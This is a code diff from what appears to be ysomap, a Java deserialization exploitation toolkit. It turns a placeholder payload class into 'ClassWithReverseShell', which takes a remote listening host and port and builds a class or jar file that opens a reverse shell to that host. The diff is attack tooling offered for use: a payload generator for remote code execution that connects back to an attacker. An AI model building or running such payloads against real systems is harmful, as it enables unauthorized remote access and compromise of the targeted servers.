@@ -4,17 +4,26 @@ import ysomap.common.annotation.Bullets;
 import ysomap.common.annotation.NotNull;
 import ysomap.common.annotation.Require;
 import ysomap.core.bean.Bullet;
+import ysomap.core.util.ClassFiles;
 
 /**
  * @author wh1t3P1g
- * @since 2020/9/5
+ * @since 2020/10/28
  */
 @Bullets
-public class ClassWithFileManagerFunction extends Bullet<byte[]> {
+public class ClassWithReverseShell extends Bullet<byte[]> {
 
     @NotNull
     @Require(name = "classname", detail = "所需生成的类名")
     public String classname;
+
+    @NotNull
+    @Require(name = "rhost", detail = "远程监听ip")
+    public String rhost;
+
+    @NotNull
+    @Require(name = "rport", detail = "远程监听端口")
+    public String rport;
 
     @NotNull
     @Require(name = "type", detail = "所需生成的文件类型，支持class或jar")
@@ -22,6 +31,7 @@ public class ClassWithFileManagerFunction extends Bullet<byte[]> {
 
     @Override
     public byte[] getObject() throws Exception {
-        return new byte[0];
+        String code = "host=\""+rhost+"\";\nport="+rport+";";
+        return ClassFiles.makeClassWithReverseShell(classname, code);
     }
 }
